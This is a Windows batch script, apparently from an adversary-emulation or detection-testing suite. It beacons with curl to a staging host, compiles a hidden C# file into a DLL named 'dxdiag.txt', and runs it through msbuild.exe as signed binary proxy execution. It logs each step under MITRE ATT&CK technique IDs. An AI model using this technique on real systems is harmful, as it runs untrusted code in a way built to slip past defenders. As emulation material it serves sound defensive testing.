@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET jfyk=%APPDATA%\10104\7ebfd64e
SET rkfn=https://10.0.0.49
SET xzwb=https://10.0.0.49/stage/2/icon.png?10104-10
SET tqgm=ITZEL-S2BS
SET lcpm=10
SET mfhd=dxdiag.txt
SET wlqb=file.txt
SET pdvf=10104
SET vgyb=%APPDATA%\!lcpm!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: heartbeat_start=>> "!vgyb!" 2>nul
curl -k -s -o nul "!xzwb!"
echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: heartbeat_complete=>> "!vgyb!" 2>nul

SET vdzt=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
SET cdwr=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe

echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: chdir_start=!jfyk!>> "!vgyb!" 2>nul
cd /d "!jfyk!" 2>nul
echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: chdir_complete=!errorlevel!>> "!vgyb!" 2>nul

echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: compile_start=!wlqb!>> "!vgyb!" 2>nul
"!vdzt!" /target:library /reference:Microsoft.Build.Framework.dll "!wlqb!" /out:"!mfhd!" 2>nul
SET vnpv=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: compile_complete=!vnpv!>> "!vgyb!" 2>nul

SET xkbg=T1500|Compile After Delivery
IF !vnpv! EQU 0 (SET xpnc=1&SET zjcx=) ELSE (SET xpnc=0&SET zjcx=compile_failed)
echo [!DATE! !TIME!][TTP][!tqgm!][!pdvf!]: !xkbg!=!xpnc!:!zjcx!>> "!vgyb!" 2>nul

echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: msbuild_start=!cdwr!>> "!vgyb!" 2>nul
"!cdwr!" /logger:LoggerEntry,"!jfyk!\!mfhd!";MyParameters,Foo 2>nul
SET rwcy=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!tqgm!][!pdvf!]: msbuild_complete=!rwcy!>> "!vgyb!" 2>nul

SET jmcg=T1218|Signed Binary Proxy Execution
IF !rwcy! EQU 0 (SET swvl=1&SET gqtf=) ELSE (SET swvl=0&SET gqtf=execution_failed)
echo [!DATE! !TIME!][TTP][!tqgm!][!pdvf!]: !jmcg!=!swvl!:!gqtf!>> "!vgyb!" 2>nul
ENDLOCAL